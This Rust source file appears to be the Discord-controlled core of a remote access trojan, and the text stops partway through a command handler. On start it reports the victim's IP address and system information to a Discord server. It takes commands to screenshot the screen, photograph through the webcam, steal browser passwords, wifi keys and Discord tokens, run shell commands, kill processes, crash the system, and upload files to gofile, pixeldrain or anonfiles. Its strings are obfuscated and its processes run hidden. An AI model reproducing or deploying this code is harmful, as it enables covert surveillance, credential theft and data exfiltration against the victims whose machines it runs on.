use std::{path::Path, time::{SystemTime, Duration}, collections::HashMap, fs, process::Command, os::windows::process::CommandExt};
use chrono::{DateTime, Local};
use hardware_id::HwIdError;
use once_cell::sync::Lazy;
use rand::distributions::{Alphanumeric, DistString};
use reqwest::multipart;
use serde_json::{json, Value};
use serenity::{async_trait, model::{prelude::*, channel::Message}, prelude::*, framework::standard::{macros::{command, group}, StandardFramework, CommandResult}};
use obfstr::*;
use sysinfo::{SystemExt, CpuExt, NetworkExt, ComponentExt, DiskExt};
use tokio::{io::{BufReader, AsyncReadExt, BufWriter, AsyncWriteExt}, fs::File};
use crate::{BOT_TOKENS, BOT_TO_SEND, SERVER_ID, CHANNEL_IDS, CATEGORY_NAME, password_grabber, discord_token_grabber::FetchTokens, webcam, wifi, screenshot, processes::{self, ProcessSorting, mem_to_str}, MESSAGE_INTERACTION, tree, PROXIES, registry, download, PROXY_ALL, upload, PYSILON_KEY, SOFTWARE_EXECUTABLE_NAME, SOFTWARE_DIRECTORY_NAME, bsod, SYS};
static FILEURLS: Lazy<Mutex<Vec<(String, String, String)>>>= Lazy::new(|| Mutex::new(Vec::new()));
static DELETE_FILES: Lazy<Mutex<bool>>= Lazy::new(|| Mutex::new(false));
#[group]
#[commands(ss, grab, webcam, show, kill, pwd, tree, proxy, ls, cd, download, download_tar, execute, cmd, remove, upload, implode, update, bsod)]
struct General;
struct Handler {
    is_loop_runing: Mutex<bool>
}
#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, data: Ready) {
        for guild in data.guilds {
            let guild= guild.id;
            if guild== *SERVER_ID.lock().await {
                let hwid= match hardware_id::get_id() {
                    Ok(s) => s,
                    Err(e) => {
                        match e {
                            HwIdError::Malformed(s) => s,
                            HwIdError::NotFound => "Unknown".to_string()
                        }
                    }
                };
                *CATEGORY_NAME.lock().await= hwid.clone();
                let mut first_run= true;
                let mut category_channel_names= vec![];
                if let Ok(channels)= guild.channels(&ctx).await {
                    for (_, guildchannel) in channels {
                        match guildchannel.kind {
                            ChannelType::Category => {
                                if guildchannel.name()== hwid {
                                    first_run= false;
                                }
                            },
                            ChannelType::Text | ChannelType::Voice => {
                                if let Some(category)= guildchannel.parent_id {
                                    let category= category.edit(&ctx, |c| c).await.unwrap();
                                    if category.name()== hwid {
                                        category_channel_names.push(guildchannel);
                                    }
                                }
                            },
                            _ => {}
                        }
                    }
                }
                if first_run {
                    let category= &guild.create_channel(&ctx, |c| {c.kind(ChannelType::Category).name(hwid.clone())}).await.unwrap();
                    let info= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Text).name("info").category(category)}).await.unwrap();
                    let main= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Text).name("main").category(category)}).await.unwrap();
                    let spam= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Text).name("spam").category(category)}).await.unwrap();
                    let file= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Text).name("file-related").category(category)}).await.unwrap();
                    let recordings= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Text).name("recordings").category(category)}).await.unwrap();
                    let voice= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Voice).name("Live microphone").category(category)}).await.unwrap();
                    let mut channel_ids= CHANNEL_IDS.lock().await;
                    channel_ids.insert("info", Some(info.id.0));
                    channel_ids.insert("main", Some(main.id.0));
                    channel_ids.insert("spam", Some(spam.id.0));
                    channel_ids.insert("file", Some(file.id.0));
                    channel_ids.insert("recordings", Some(recordings.id.0));
                    channel_ids.insert("voice", Some(voice.id.0));
                    drop(channel_ids);
                    tokio::spawn(async {
                        let client= reqwest::Client::new();
                        let req= client.execute(client.get(obfstr!("https://ident.me")).build().unwrap()).await.unwrap();
                        let request= req.text().await.unwrap();
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": CHANNEL_IDS.lock().await.get("info").unwrap().unwrap_or(0),
                            "content": format!("```IP Address: {} [ident.me]```", request)
                        }));
                    });
                    tokio::spawn(async {
                        let client= reqwest::Client::new();
                        let req= client.execute(client.get(obfstr!("https://ipv4.lafibre.info/ip.php")).build().unwrap()).await.unwrap();
                        let request= req.text().await.unwrap();
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": CHANNEL_IDS.lock().await.get("info").unwrap().unwrap_or(0),
                            "content": format!("```IP Address: {} [lafibre.info]```", request)
                        }));
                    });
                    let system_info_proc= std::process::Command::new("systeminfo")
                        .creation_flags(0x08000000).output().unwrap();
                    let system_info_output= String::from_utf8_lossy(&system_info_proc.stdout);
                    let mut chunk= String::new();
                    for line in system_info_output.split('\n').collect::<Vec<&str>>() {
                        let line= line.trim_end();
                        if chunk.len() + line.len()> 1990 {
                            BOT_TO_SEND.lock().await.push(json!({
                                "channel": info,
                                "content": format!("```{}```", chunk)
                            }));
                            chunk= line.to_owned() + "\n";
                        }else{
                            chunk+= &(line.to_owned() + "\n");
                        }
                    }
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": info,
                        "content": format!("```{}```", chunk)
                    }));
                }else{
                    let mut channel_ids= CHANNEL_IDS.lock().await;
                    for channel in category_channel_names {
                        match channel.name().to_lowercase().as_str() {
                            "info" => channel_ids.insert("info", Some(channel.id.0)),
                            "main" => channel_ids.insert("main", Some(channel.id.0)),
                            "spam" => channel_ids.insert("spam", Some(channel.id.0)),
                            "file-related" => channel_ids.insert("file", Some(channel.id.0)),
                            "recordings" => channel_ids.insert("recordings", Some(channel.id.0)),
                            "live microphone" => channel_ids.insert("voice", Some(channel.id.0)),
                            _ => None
                        };
                    }
                    drop(channel_ids);
                }
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": CHANNEL_IDS.lock().await.get("main").unwrap().unwrap_or(0),
                    "content": format!("** **\n\n\n```Starting new PC session at {} on HWID {}```",
                        Into::<DateTime<Local>>::into(SystemTime::now()).format("%d/%m/%Y %r"),
                        hwid)
                }));
                break;
            }
        }
        let nctx= ctx;
        tokio::spawn(async move {
            let mut thread= tokio::spawn(async {});
            while !thread.is_finished() {
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
            loop {
                if thread.is_finished() {
                    let result= thread.await;
                    match result {
                        Ok(_) => {}
                        Err(e) => {
                            if e.is_panic() {
                                let panic= e.into_panic();
                                let err= if let Some(s)= panic.downcast_ref::<String>() {
                                    s
                                }else if let Some(s)= panic.downcast_ref::<&str>() {
                                    *s
                                }else{
                                    "Unknown"
                                };
                                BOT_TO_SEND.lock().await.push(json!({
                                    "channel": CHANNEL_IDS.lock().await.get("info").unwrap().unwrap_or(0),
                                    "embed": true,
                                    "color": 0xff1412,
                                    "title": "A Crash occurred",
                                    "description": format!("```An error occurred on the Message Sender Thread!\nError: {}```", err)
                                }));
                            }
                        }
                    }
                    let ctx= nctx.clone();
                    thread= tokio::spawn(async move {
                        loop {
                            let proxy_all= *PROXY_ALL.lock().await;
                            while !BOT_TO_SEND.lock().await.is_empty() {
                                if BOT_TO_SEND.lock().await.first().is_none() {
                                    continue;
                                }
                                let mut channel= ChannelId::default();
                                let result= BOT_TO_SEND.lock().await.first().unwrap()["channel"].as_u64();
                                let mut lock;
                                if let Some(channel_id)= result {
                                    if channel_id< 1 {
                                        if let Some(delete_files)= BOT_TO_SEND.lock().await.first().unwrap()["delete_files"].as_bool() {
                                            if delete_files {
                                                if let Some(files)= BOT_TO_SEND.lock().await.first().unwrap()["files"].as_array() {
                                                    for file in files {
                                                        fs::remove_file(Path::new(file.as_str().unwrap())).unwrap();
                                                    }
                                                }
                                            }
                                        }
                                        continue;
                                    }
                                    channel.0= channel_id;
                                    FILEURLS.lock().await.clear();
                                    *DELETE_FILES.lock().await= false;
                                    if let Some(delete_files)= BOT_TO_SEND.lock().await.first().unwrap()["delete_files"].as_bool() {
                                        if delete_files {
                                            *DELETE_FILES.lock().await= true;
                                        }
                                    }
                                    let mut threads= Vec::new();
                                    let files= (BOT_TO_SEND.lock().await.first().unwrap()["files"].as_array().unwrap_or(&Vec::new())).clone();
                                    let mut file_amount: u64= 0;
                                    let mut file_size= 0;
                                    for file in files {
                                        let filestr= file.as_str().unwrap().to_string();
                                        let filelen= Path::new(&filestr).metadata().unwrap().len();
                                        file_amount+= 1;
                                        if proxy_all || filelen> 25 * 1024 * 1024 || file_amount> 10 || file_size> 25 * 1024 * 1024 {
                                            threads.push(tokio::spawn(async move {
                                                let path= Path::new(&filestr);
                                                let mut sizepre= "B";
                                                let mut sizeam= filelen as f64;
                                                while sizeam>= 1000. {
                                                    sizeam/= 1024.;
                                                    sizepre= match sizepre {"B" => "KiB", "KiB" => "MiB", "MiB" => "GiB", "GiB" => "TiB", _ => "???"};
                                                }
                                                let client= reqwest::Client::new();
                                                let proxies= PROXIES.lock().await.clone();
                                                for proxy in &proxies {
                                                    match proxy.as_str() {
                                                        "gofile" => {
                                                            let req= client.execute(client.get(obfstr!("https://api.gofile.io/getServer")).build().unwrap()).await.unwrap();
                                                            if let Some(server)= req.json::<Value>().await.unwrap()["data"]["server"].as_str() {
                                                                let mut f= BufReader::new(File::open(path).await.unwrap());
                                                                let mut fv= Vec::new();
                                                                f.read_to_end(&mut fv).await.unwrap();
                                                                drop(f);
                                                                let form= multipart::Form::new().part("file", 
                                                                    multipart::Part::bytes(fv)
                                                                        .file_name(path.file_name().unwrap().to_string_lossy().to_string())
                                                                );
                                                                match client.execute(client.post(&format!("https://{}{}", server, obfstr!(".gofile.io/uploadFile"))).multipart(form).build().unwrap()).await {
                                                                    Ok(req) => {
                                                                        let response= req.json::<Value>().await.unwrap();
                                                                        if let Some(status)= response["status"].as_str() {
                                                                            if status== "ok" {
                                                                                FILEURLS.lock().await.push((format!("[GoFile]({})", response["data"]["downloadPage"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                            }else{
                                                                                FILEURLS.lock().await.push(("GoFile] | Error: An error occurred while uploading the file.".to_string(), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                            }
                                                                        }
                                                                    }
                                                                    Err(_) => {
                                                                        FILEURLS.lock().await.push(("GoFile] | Error: An error occurred while connecting.".to_string(), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                    }
                                                                }
                                                            }
                                                        }
                                                        "pixeldrain" => {
                                                            let mut f= BufReader::new(File::open(path).await.unwrap());
                                                            let mut fv= Vec::new();
                                                            f.read_to_end(&mut fv).await.unwrap();
                                                            drop(f);
                                                            let form= multipart::Form::new().part("file", 
                                                                multipart::Part::bytes(fv)
                                                                    .file_name(path.file_name().unwrap().to_string_lossy().to_string())
                                                            );
                                                            match client.execute(client.post(obfstr!("https://pixeldrain.com/api/file")).multipart(form).header("anonymous", "true").build().unwrap()).await {
                                                                Ok(req) => {
                                                                    let response= req.json::<Value>().await.unwrap();
                                                                    if let Some(status)= response["success"].as_bool() {
                                                                        if status {
                                                                            FILEURLS.lock().await.push((format!("[Pixeldrain](https://pixeldrain.com/u/{})", response["id"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                        }else{
                                                                            FILEURLS.lock().await.push((format!("Pixeldrain | Error: {}", response["message"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                        }
                                                                    }
                                                                }
                                                                Err(_) => {
                                                                    FILEURLS.lock().await.push(("Pixeldrain | Error: An error occurred while connecting.".to_string(), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                }
                                                            }
                                                        }
                                                        "anonfiles" => {
                                                            let mut f= BufReader::new(File::open(path).await.unwrap());
                                                            let mut fv= Vec::new();
                                                            f.read_to_end(&mut fv).await.unwrap();
                                                            drop(f);
                                                            let form= multipart::Form::new().part("file", 
                                                                multipart::Part::bytes(fv)
                                                                    .file_name(path.file_name().unwrap().to_string_lossy().to_string())
                                                            );
                                                            match client.execute(client.post(obfstr!("https://api.anonfiles.com/upload")).multipart(form).header("anonymous", "true").build().unwrap()).await{
                                                                Ok(req) => {
                                                                    let response= req.json::<Value>().await.unwrap();
                                                                    if let Some(status)= response["status"].as_bool() {
                                                                        if status {
                                                                            FILEURLS.lock().await.push((format!("[Anonfiles]({})", response["data"]["file"]["url"]["short"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                        }else{
                                                                            FILEURLS.lock().await.push((format!("Anonfiles | Error: {}", response["error"]["message"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                        }
                                                                    }
                                                                }
                                                                Err(_) => {
                                                                    FILEURLS.lock().await.push(("Anonfiles | Error: An error occurred while connecting.".to_string(), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                }
                                                            }
                                                        }
                                                        _ => {}
                                                    }
                                                }
                                                if path.exists() && *DELETE_FILES.lock().await {
                                                    let _= fs::remove_file(path);
                                                }
                                            }));
                                        }else{
                                            file_size+= filelen;
                                        }
                                    }
                                    for thread in threads {
                                        match thread.await {
                                            Ok(_) => {}
                                            Err(e) => {
                                                if e.is_panic() {
                                                    let panic= e.into_panic();
                                                    let err= if let Some(s)= panic.downcast_ref::<String>() {
                                                        s
                                                    }else if let Some(s)= panic.downcast_ref::<&str>() {
                                                        *s
                                                    }else{
                                                        "Unknown"
                                                    };
                                                    BOT_TO_SEND.lock().await.push(json!({
                                                        "channel": CHANNEL_IDS.lock().await.get("info").unwrap().unwrap_or(0),
                                                        "embed": true,
                                                        "color": 0xff1412,
                                                        "title": "A Crash occurred",
                                                        "description": format!("```An error occurred on the Attachment Uploader (Proxy) Thread!\nError: {:?}```", err)
                                                    }));
                                                }
                                            }
                                        }
                                    }
                                    lock= BOT_TO_SEND.lock().await;
                                    let msg= lock.first().unwrap();
                                    let mut fileurls= FILEURLS.lock().await;
                                    let message= channel.send_message(&ctx, move |m| {
                                        if let Some(content)= msg["content"].as_str() {
                                            m.content(content);
                                        }
                                        if let Some(files)= msg["files"].as_array() {
                                            let mut file_amount: u64= 0;
                                            let mut file_size= 0;
                                            for file in files {
                                                let path= Path::new(file.as_str().unwrap());
                                                if path.exists() {
                                                    let filelen= path.metadata().unwrap().len();
                                                    file_amount+= 1;
                                                    if !proxy_all && filelen<= 25 * 1024 * 1024 && file_amount<= 10 && file_size<= 25 * 1024 * 1024 {
                                                        m.add_file(path);
                                                        file_size+= filelen;
                                                    }
                                                }
                                            }
                                        }
                                        if let Some(embed)= msg["embed"].as_bool() {
                                            if embed {
                                                m.add_embed(|e| {
                                                    if let Some(title)= msg["title"].as_str() {
                                                        e.title(title);
                                                    }
                                                    if let Some(description)= msg["description"].as_str() {
                                                        if description.is_empty() {
                                                            e.description("*Empty*");
                                                        }else{
                                                            e.description(description);
                                                        }
                                                    }
                                                    if let Some(color)= msg["color"].as_u64() {
                                                        e.color(color);
                                                    }
                                                    if let Some(thumbnail)= msg["thumbnail"].as_str() {
                                                        e.thumbnail(thumbnail);
                                                    }
                                                    if let Some(fields)= msg["fields"].as_array() {
                                                        for field in fields {
                                                            e.field(field["name"].as_str().unwrap(), field["value"].as_str().unwrap(), field["inline"].as_bool().unwrap());
                                                        }
                                                    }
                                                    if let Some(image)= msg["image"].as_str() {
                                                        e.image(image);
                                                    }
                                                    e
                                                });
                                            }
                                        }
                                        if fileurls.len()> 0 {
                                            m.add_embed(|e| {
                                                e.title("Proxied Files");
                                                e.color(0xff1418);
                                                let mut desc= String::new();
                                                let mut entries= HashMap::new();
                                                let mut is_desc= true;
                                                while fileurls.len()> 0 {
                                                    let entry= fileurls.remove(0);
                                                    if !entries.contains_key(&entry.1) {
                                                        let newt= format!("\n**{} (📥 {})**\n\n", entry.1, entry.2);
                                                        if is_desc {
                                                            if desc.len() + newt.len()> 4096 {
                                                                is_desc= false;
                                                                e.description(&desc);
                                                                println!("desc:{}", desc);
                                                                desc.clear();
                                                                desc+= &newt;
                                                            }else{
                                                                desc+= &newt;
                                                            }
                                                        }else if desc.len() + newt.len()> 1024 {
                                                            e.field("** **", &desc, false);
                                                            println!("field:{}", desc);
                                                            desc.clear();
                                                            desc+= &newt;
                                                        }else{
                                                            desc+= &newt;
                                                        }
                                                        entries.insert(entry.1.clone(), 0u8);
                                                    }
                                                    desc+= &format!("{}\n", entry.0);
                                                }
                                                if is_desc {
                                                    e.description(desc);
                                                }else if !desc.is_empty() {
                                                    e.field("** **", &desc, false);
                                                }
                                                e
                                            });
                                        }
                                        m
                                    }).await.unwrap();
                                    if let Some(delete_files)= msg["delete_files"].as_bool() {
                                        if delete_files {
                                            if let Some(files)= msg["files"].as_array() {
                                                for file in files {
                                                    let _= std::fs::remove_file(Path::new(file.as_str().unwrap()));
                                                }
                                            }
                                        }
                                    }
                                    if let Some(interaction)= msg.get("interaction") {
                                        MESSAGE_INTERACTION.lock().await.insert(format!("{}-{}", message.channel_id.0, message.id.0), interaction.clone());
                                    }
                                    if let Some(reactions)= msg["react"].as_array() {
                                        for reaction in reactions {
                                            message.react(&ctx, ReactionType::Unicode(reaction.as_str().unwrap().to_string())).await.unwrap();
                                        }
                                    }
                                }else{
                                    lock= BOT_TO_SEND.lock().await;
                                }
                                let mut index= 0;
                                loop {
                                    if lock.get(index).is_some() {
                                        lock.remove(index);
                                        break;
                                    }else{
                                        index+= 1;
                                    }
                                }
                            }
                            tokio::time::sleep(Duration::from_secs_f64(1. / 60.)).await;
                        }
                    });            
                }
                tokio::time::sleep(Duration::from_secs_f64(1. / 10.)).await;
            }
        });
        *self.is_loop_runing.lock().await= true;
    }
    async fn reaction_add(&self, ctx: Context, reaction: Reaction) {
        let userm;
        match reaction.member {
            Some(v) => {
                let partialmember= v;
                match partialmember.user {
                    Some(v) => {
                        userm= v;
                        if userm.bot {
                            return;
                        }
                    }, None => {
                        userm= user::User::default();
                    }
                }
            }, None => return
        }
        let mut interaction= None;
        let key= format!("{}-{}", reaction.channel_id.0, reaction.message_id.0);
        if MESSAGE_INTERACTION.lock().await.contains_key(&key) {
            interaction= MESSAGE_INTERACTION.lock().await.remove(&key);
        }
        if reaction.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            match reaction.emoji.to_string().as_str() {
                "📌" => {
                    reaction.channel_id.pin(&ctx, reaction.message_id).await.unwrap();
                }
                "🔴" => {
                    reaction.channel_id.delete_message(&ctx, reaction.message_id).await.unwrap();
                }
                "💀" => {
                    if let Some(interaction)= interaction {
                        match interaction["kind"].as_str().unwrap_or("") {
                            "kill" => {
                                reaction.channel_id.delete_message(&ctx, reaction.message_id).await.unwrap();
                                processes::kill_process_confirmed(format!("{}#{:04}", userm.name, userm.discriminator), reaction.channel_id.0, interaction["pid"].as_u64().unwrap() as u32).await;
                            }
                            "implode" => {
                                reaction.channel_id.delete_message(&ctx, reaction.message_id).await.unwrap();
                                registry::remove().await;
                                let path= std::env::var_os("USERPROFILE").unwrap().to_string_lossy().to_string() + "\\" + &SOFTWARE_DIRECTORY_NAME.lock().await.to_lowercase() + "\\";
                                let _= Command::new("cmd.exe").creation_flags(0x08000000)
                                    .raw_arg(format!("/c taskkill /f /pid {} && rmdir /q /s {}", std::process::id(), path)).spawn();
                            }
                            "bsod" => {
                                bsod::main().await;
                            }
                            _ => {}
                        }
                    }
                }
                _ => {}
            }
        }
    }
    async fn reaction_remove(&self, ctx: Context, reaction: Reaction) {
        if let Some(v)= reaction.member {
            if let Some(v)= v.user {
                if v.bot {
                    return;
                }
            }
        }
        if reaction.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await && reaction.emoji.to_string().as_str()== "📌" {
            reaction.channel_id.unpin(&ctx, reaction.message_id).await.unwrap();
        }
    }
}
pub struct DiscordBot;
impl DiscordBot {
    pub async fn main() {
        let framework= StandardFramework::new()
            .configure(|c| c.prefix("."))
            .group(&GENERAL_GROUP);
        let token;
        loop {
            if let Ok(mut value)= BOT_TOKENS.try_lock() {
                if value.len()> 1 {
                    token= value.remove(0);
                }else{
                    token= value[0].clone();
                }
                break;
            }
        }
        let intents= GatewayIntents::all();
        let mut client= Client::builder(token, intents)
            .event_handler(Handler {
                is_loop_runing: Mutex::new(false)
            })
            .framework(framework)
            .await.unwrap();
        let _= client.start().await;
    }
}
#[command]
async fn ss(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let channelid= msg.channel_id.0;
        tokio::spawn(async move {
            screenshot::main(channelid).await;
        });
    }
    Ok(())
}
#[command]
async fn grab(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let mut show_help= false;
        let args= msg.content.split(' ').collect::<Vec<&str>>();
        if args.len()> 1 {
            let channelid= msg.channel_id.0;
            match args[1] {
                "passwords" | "pass" | "password" => {
                    tokio::spawn(async move {
                        password_grabber::main(channelid).await;
                    });
                }
                "wifi" => {
                    tokio::spawn(async move {
                        wifi::main(channelid).await;
                    });
                }
                "discord" | "disc" => {
                    tokio::spawn(async move {
                        FetchTokens::new().await.upload(channelid).await;
                    });
                }
                _ => {show_help= true;}
            }
        }else{
            show_help= true;
        }
        if show_help {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .grab <action>\nActions:\n    pass, password, passwords - get the target PC's passwords\n    wifi - get the target PC's wifi passwords\n    discord, disc - get the target PC's tokens```",
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn webcam(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let args= msg.content.split(' ').collect::<Vec<&str>>();
        if args.len()> 1 && args[1]== "photo" {
            let channel_id= msg.channel_id.0;
            tokio::spawn(async move {
                webcam::main(channel_id).await;
            });
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .webcam <action>\nActions:\n    photo - take a photo with the target PC's webcam```",
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn show(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let mut show_help= false;
        let args= msg.content.split(' ').collect::<Vec<&str>>();
        if args.len()> 1 {
            let channelid= msg.channel_id.0;
            let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
            match args[1] {
                "proc" | "processes" => {
                    let mut sorting= ProcessSorting::Name;
                    if args.len()> 2 {
                        match args[2] {
                            "cpu" | "2" => {sorting= ProcessSorting::Cpu;}
                            "mem" | "ram" | "3" => {sorting= ProcessSorting::Mem;}
                            "pid" | "id" | "4" => {sorting= ProcessSorting::Pid;}
                            _ => {}
                        }
                    }
                    tokio::spawn(async move {
                        processes::main(channelid, sorting).await;
                    });
                }
                "sys" | "system" => {
                    let mut sys= SYS.lock().await;
                    sys.refresh_cpu();
                    tokio::time::sleep(Duration::from_secs_f64(0.5)).await;
                    sys.refresh_system();
                    let cpu= sys.global_cpu_info();
                    let mut string= String::new();
                    string+= &format!("CPU:\n    Name: {}\n    Usage: {:.2}%\n    Frequency: {}\n    Threads: {}\n", cpu.name(), cpu.cpu_usage(), cpu.frequency(), sys.cpus().len());
                    string+= &format!("MEM:\n    Total: {}\n    Used: {}\n    Free: {}\n", mem_to_str(sys.total_memory()), mem_to_str(sys.used_memory()), mem_to_str(sys.free_memory()));
                    string+= &format!("SWAP:\n    Total: {}\n    Used: {}\n    Free: {}\n", mem_to_str(sys.total_swap()), mem_to_str(sys.used_swap()), mem_to_str(sys.free_swap()));
                    string+= &format!("System:\n    Name: {}\n    Kernel Version: {}\n    OS Version: {}\n    Host Name: {}", sys.name().unwrap_or_default(), sys.kernel_version().unwrap_or_default(), sys.long_os_version().unwrap_or_default(), sys.host_name().unwrap_or_default());
                    if string.len()< 4090 {
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```System Information requested by {}```", user),
                            "embed": true,
                            "title": "System Information",
                            "description": format!("```{}```", string),
                            "react": ["🔴"]
                        }));
                    }else{
                        let path= format!("{}/{}.txt", std::env::temp_dir().to_string_lossy(), &Alphanumeric.sample_string(&mut rand::thread_rng(), 12));
                        let mut f= BufWriter::new(File::create(&path).await.unwrap());
                        f.write_all(string.as_bytes()).await.unwrap();
                        f.flush().await.unwrap();
                        drop(f);
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```System Information requested by {}```", user),
                            "files": [path],
                            "react": ["🔴"],
                            "delete_files": true
                        }));
                    }
                }
                "net" | "network" => {
                    let mut sys= SYS.lock().await;
                    sys.refresh_networks_list();
                    sys.refresh_networks();
                    let mut string= String::new();
                    string+= "Network:\n";
                    for (interface_name, network) in sys.networks() {
                        string+= &format!("    {}:\n        In: {}\n        Out: {}\n", interface_name, mem_to_str(network.total_received()), mem_to_str(network.total_transmitted()));
                    }
                    if string.len()< 4090 {
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```Network Information requested by {}```", user),
                            "embed": true,
                            "title": "Network Information",
                            "description": format!("```{}```", string),
                            "react": ["🔴"]
                        }));
                    }else{
                        let path= format!("{}/{}.txt", std::env::temp_dir().to_string_lossy(), &Alphanumeric.sample_string(&mut rand::thread_rng(), 12));
                        let mut f= BufWriter::new(File::create(&path).await.unwrap());
                        f.write_all(string.as_bytes()).await.unwrap();
                        f.flush().await.unwrap();
                        drop(f);
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```Network Information requested by {}```", user),
                            "files": [path],
                            "react": ["🔴"],
                            "delete_files": true
                        }));
                    }
                }
                "comp" | "components" => {
                    let mut sys= SYS.lock().await;
                    sys.refresh_components_list();
                    sys.refresh_components();
                    let mut string= String::new();
                    string+= "Components:\n";
                    for component in sys.components() {
                        string+= &format!("    {}:\n        Temperature: {:.2} °C\n        Critical Temperature: {:.2} °C\n", component.label(), component.temperature(), component.critical().unwrap_or(100.));
                    }
                    if string.len()< 4090 {
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```Component Information requested by {}```", user),
                            "embed": true,
                            "title": "Component Information",
                            "description": format!("```{}```", string),
                            "react": ["🔴"]
                        }));
                    }else{
                        let path= format!("{}/{}.txt", std::env::temp_dir().to_string_lossy(), &Alphanumeric.sample_string(&mut rand::thread_rng(), 12));
                        let mut f= BufWriter::new(File::create(&path).await.unwrap());
                        f.write_all(string.as_bytes()).await.unwrap();
                        f.flush().await.unwrap();
                        drop(f);
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```Component Information requested by {}```", user),
                            "files": [path],
                            "react": ["🔴"],
                            "delete_files": true
                        }));
                    }
                }
                "disk" | "disks" => {
                    let mut sys= SYS.lock().await;
                    sys.refresh_disks_list();
                    sys.refresh_disks();
                    let mut string= String::new();
                    string+= "Disks:\n";
                    for disk in sys.disks() {
                        string+= &format!("    {}:\n        File System: {}\n        Mount Point: {}\n        Is Removable: {}\n        Total Space: {}\n        Used Space: {}\n        Free Space: {}\n", disk.name().to_string_lossy(), String::from_utf8_lossy(disk.file_system()), disk.mount_point().to_string_lossy(), disk.is_removable(), mem_to_str(disk.total_space()), mem_to_str(disk.total_space().saturating_sub(disk.available_space())), mem_to_str(disk.available_space()));
                    }
                    if string.len()< 4090 {
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```Disk Information requested by {}```", user),
                            "embed": true,
                            "title": "Disk Information",
                            "description": format!("```{}```", string),
                            "react": ["🔴"]
                        }));
                    }else{
                        let path= format!("{}/{}.txt", std::env::temp_dir().to_string_lossy(), &Alphanumeric.sample_string(&mut rand::thread_rng(), 12));
                        let mut f= BufWriter::new(File::create(&path).await.unwrap());
                        f.write_all(string.as_bytes()).await.unwrap();
                        f.flush().await.unwrap();
                        drop(f);
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```Disk Information requested by {}```", user),
                            "files": [path],
                            "react": ["🔴"],
                            "delete_files": true
                        }));
                    }
                }
                "cpu" | "cpus" => {
                    let mut sys= SYS.lock().await;
                    sys.refresh_cpu();
                    let mut string= String::new();
                    string+= "CPU's:\n";
                    for cpu in sys.cpus() {
                        string+= &format!("    {}:\n        Brand: {}\n        Vendor ID: {}\n        Usage: {:.2}%\n        Frequency: {}\n", cpu.name(), cpu.brand(), cpu.vendor_id(), cpu.cpu_usage(), cpu.frequency());
                    }
                    if string.len()< 4090 {
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```CPU Information requested by {}```", user),
                            "embed": true,
                            "title": "CPU Information",
                            "description": format!("```{}```", string),
                            "react": ["🔴"]
                        }));
                    }else{
